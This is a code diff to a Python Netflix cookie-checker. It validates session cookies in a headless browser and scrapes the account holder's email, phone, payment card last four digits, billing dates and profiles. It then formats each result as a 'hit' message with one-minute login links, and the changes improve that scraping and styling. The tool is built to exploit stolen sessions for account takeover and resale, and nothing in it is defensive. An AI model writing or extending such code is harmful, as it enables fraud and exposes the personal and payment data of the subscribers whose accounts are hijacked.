@@ -151,6 +151,9 @@ def extract_deep_details(html):
         
         # Try to find last 4 digits
         last4 = re.search(r'"last4":"(\d+)"', html)
+        if not last4:
+             last4 = re.search(r'data-uia="payment-last4">.*?(\d{4})<', html)
+        
         if last4 and "Unknown" not in details["payment"]:
              details["payment"] += f" (**** {last4.group(1)})"
 
@@ -220,6 +223,10 @@ def extract_deep_details(html):
         if not details["profiles"]:
              avatars = re.findall(r'"avatarName":"([^"]+)"', html)
              if avatars: details["profiles"] = list(set([clean_text(p) for p in avatars]))
+        
+        # Filter out "Add Profile" buttons
+        if details["profiles"]:
+            details["profiles"] = [p for p in details["profiles"] if p not in ["Add Profile", "Add", "New Profile", "add-profile"]]
 
     except: pass
     return details
@@ -286,8 +293,10 @@ def check_cookie(cookie_input):
                         pg.goto("https://www.netflix.com/browse", timeout=8000, wait_until='domcontentloaded')
                         
                         # Fix Black Screenshot: Wait for content to render
-                        try: pg.wait_for_timeout(1500)
-                        except: pass
+                        try: 
+                            pg.wait_for_selector('.main-header', state='visible', timeout=3000)
+                        except: 
+                            pg.wait_for_timeout(2500)
                         
                         # Fix Profiles: Extract directly from browser (Accurate)
                         try:
@@ -295,6 +304,7 @@ def check_cookie(cookie_input):
                             pw_profiles = re.findall(r'class="profile-name">([^<]+)<', content)
                             if pw_profiles:
                                 deep_data["profiles"] = list(set([clean_text(p) for p in pw_profiles]))
+                                deep_data["profiles"] = [p for p in deep_data["profiles"] if p not in ["Add Profile", "Add", "New Profile", "add-profile"]]
                         except: pass
 
                         screenshot_bytes = pg.screenshot(type='jpeg', quality=40)
@@ -644,43 +654,43 @@ def main():
         # Random Themes for Premium Look
         themes = [
             {
-                "header": "<b>✨ ✪ NETFLIX PREMIUM ✪ ✨</b>",
-                "status": "★ Status", "region": "🏳 Region", "since": "📆 Since",
-                "acc": "<b>👤 Details</b>", "email": "✉️ Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💲 Price",
-                "sub": "<b>📺 Sub</b>", "plan": "💎 Plan", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
-                "bill_h": "<b>🗓 Billing</b>", "bill": "📅 Date",
+                "header": "<b>💎 ⚜️ NETFLIX LUXURY ⚜️ 💎</b>",
+                "status": "🟢 Status", "region": "🌍 Region", "since": "📅 Since",
+                "acc": "<b>👤 Account Info</b>", "email": "📧 Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💲 Price",
+                "sub": "<b>📺 Subscription</b>", "plan": "👑 Plan", "qual": "🖥 Quality", "ads": "🚫 Ads", "extra": "👥 Extra",
+                "bill_h": "<b>🗓 Next Bill</b>", "bill": "📅 Date",
                 "prof": "<b>🎭 Profiles</b>",
-                "link_h": "<b>🔗 Link</b>", "link_txt": "Login", "valid": "⏳ 1m",
-                "time": "🚀 Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
+                "link_h": "<b>🔗 Magic Access</b>", "link_txt": "Click To Login", "valid": "⏳ Valid: 1 Minute",
+                "time": "⚡ Speed", "line": "━━━━━━━━━━━━━━━━━━━━━━"
             },
             {
-                "header": "<b>💠 CYBER NETFLIX SESSION 💠</b>",
-                "status": "🟢 Status", "region": "🌐 Region", "since": "📆 Since",
-                "acc": "<b>🤖 Info</b>", "email": "✉️ Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "♻️ Auto", "price": "💲 Price",
-                "sub": "<b>⚡ Plan</b>", "plan": "💎 Plan", "qual": "🖥 Qual", "ads": "⛔ Ads", "extra": "🫂 Extra",
-                "bill_h": "<b>🗓 Bill</b>", "bill": "📅 Date",
-                "prof": "<b>👥 Users</b>",
-                "link_h": "<b>⛓️ Link</b>", "link_txt": "Access", "valid": "⏱️ 1m",
-                "time": "🚀 Speed", "line": "══════════════════════"
+                "header": "<b>💠 ⚡ CYBER NETFLIX ⚡ 💠</b>",
+                "status": "❇️ Status", "region": "🌐 Region", "since": "📆 Joined",
+                "acc": "<b>🤖 User Data</b>", "email": "✉️ Mail", "phone": "📞 Mobile", "pay": "💳 Method", "auto": "♻️ Renew", "price": "💸 Cost",
+                "sub": "<b>⚡ Plan Info</b>", "plan": "💎 Tier", "qual": "📺 Res", "ads": "⛔ No Ads", "extra": "🫂 Slots",
+                "bill_h": "<b>🗓 Renewal</b>", "bill": "📅 Date",
+                "prof": "<b>👥 Who's Watching</b>",
+                "link_h": "<b>⛓️ Instant Link</b>", "link_txt": "Tap To Access", "valid": "⏱️ Expires in 60s",
+                "time": "🚀 Latency", "line": "══════════════════════"
             },
             {
-                "header": "<b>☠︎︎ NETFLIX DARK HIT ☠︎︎</b>",
-                "status": "💀 Status", "region": "🗺 Region", "since": " Since",
-                "acc": "<b>🕷 Info</b>", "email": "📨 Email", "phone": "📞 Phone", "pay": "🕸 Pay", "auto": "🔄 Auto", "price": "💸 Price",
-                "sub": "<b>𖤐 Plan</b>", "plan": "⚝ Type", "qual": "📺 Qual", "ads": "⛔ Ads", "extra": "👥 Extra",
-                "bill_h": "<b>📅 Bill</b>", "bill": "🗓 Date",
+                "header": "<b>☠︎︎ 𖤐 NETFLIX DARK 𖤐 ☠︎︎</b>",
+                "status": "💀 Status", "region": "🗺 Region", "since": "🕰 Since",
+                "acc": "<b>🕷 Owner Info</b>", "email": "📨 Email", "phone": "📞 Phone", "pay": "🕸 Pay", "auto": "🔄 Auto", "price": "💸 Price",
+                "sub": "<b>⚝ Subscription</b>", "plan": "𖤐 Plan", "qual": "📺 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
+                "bill_h": "<b>📅 Billing</b>", "bill": "🗓 Date",
                 "prof": "<b>🎭 Users</b>",
-                "link_h": "<b>🔗 Link</b>", "link_txt": "Enter", "valid": "⏳ 60s",
-                "time": "⚡ Latency", "line": "━━━━━━━━━━━━━━━━━━━━━━"
+                "link_h": "<b>🔗 Login</b>", "link_txt": "Enter Account", "valid": "⏳ 1 Min Validity",
+                "time": "⚡ Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
             },
             {
                 "header": "<b>♛ ♚ NETFLIX ROYAL ♚ ♛</b>",
-                "status": "✅ Status", "region": "🌍 Region", "since": "📅 Since",
-                "acc": "<b>👤 Owner</b>", "email": "📧 Email", "phone": "☎️ Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💰 Price",
-                "sub": "<b>📺 Sub</b>", "plan": "👑 Plan", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
-                "bill_h": "<b>📅 Bill</b>", "bill": "🗓 Date",
-                "prof": "<b>🎭 Profs</b>",
-                "link_h": "<b>🔗 Link</b>", "link_txt": "Login", "valid": "⏳ 1m",
+                "status": "✅ Status", "region": "🏳 Region", "since": "📅 Since",
+                "acc": "<b>👤 Details</b>", "email": "📧 Email", "phone": "☎️ Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💰 Price",
+                "sub": "<b>📺 Plan</b>", "plan": "👑 Type", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
+                "bill_h": "<b>🗓 Next Bill</b>", "bill": "📅 Date",
+                "prof": "<b>🎭 Profiles</b>",
+                "link_h": "<b>🔗 Access</b>", "link_txt": "Login Now", "valid": "⏳ Valid: 1 Min",
                 "time": "⏱ Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
             }
         ]
